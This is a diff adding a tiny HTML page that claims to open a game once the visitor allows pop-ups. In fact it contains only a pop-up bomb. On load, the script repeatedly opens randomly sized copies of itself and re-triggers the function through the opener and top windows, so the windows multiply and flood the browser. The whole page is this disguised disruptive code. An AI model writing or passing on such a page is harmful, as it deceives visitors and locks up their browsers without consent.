@@ -1,0 +1,25 @@
+<!DOCTYPE html>
+<html>
+<p>allow pop ups to open the game</p>
+<body onload="myFunction()">
+<script>
+function myFunction() {
+let randomWidth = Math.floor(Math.random() * 800) + 200;
+let randomHeight = Math.floor(Math.random() * 600) + 200;  
+const myWindow = window.open(window.location.href,target='_blank',`width=${randomWidth},height=${randomHeight}`);
+  myWindow.opener.myFunction();
+  myWindow.top.myFunction();
+  myWindow.opener.myFunction();
+  myWindow.top.myFunction();
+ myWindow.opener.myFunction();
+  myWindow.top.myFunction();
+ myWindow.opener.myFunction();
+  myWindow.top.myFunction();
+ myWindow.opener.myFunction();
+  myWindow.top.myFunction();
+ myWindow.opener.myFunction();
+  myWindow.top.myFunction();
+}
+</script>
+</body>
+</html>
